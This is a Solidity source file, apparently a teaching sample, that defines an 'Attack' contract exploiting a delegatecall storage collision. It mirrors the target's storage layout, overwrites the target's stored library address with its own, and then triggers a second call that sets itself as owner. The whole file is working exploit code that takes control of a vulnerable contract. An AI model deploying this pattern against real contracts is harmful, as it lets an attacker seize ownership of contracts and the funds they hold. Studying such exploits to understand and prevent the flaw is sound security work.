// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./ExampleContract.sol";

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint256 public someNumber;

    ExampleContract public exampleContract;

    constructor(ExampleContract _exampleContract) {
        exampleContract = ExampleContract(_exampleContract);
    }

    function attack() public {
        // override address of lib
        exampleContract.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        exampleContract.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}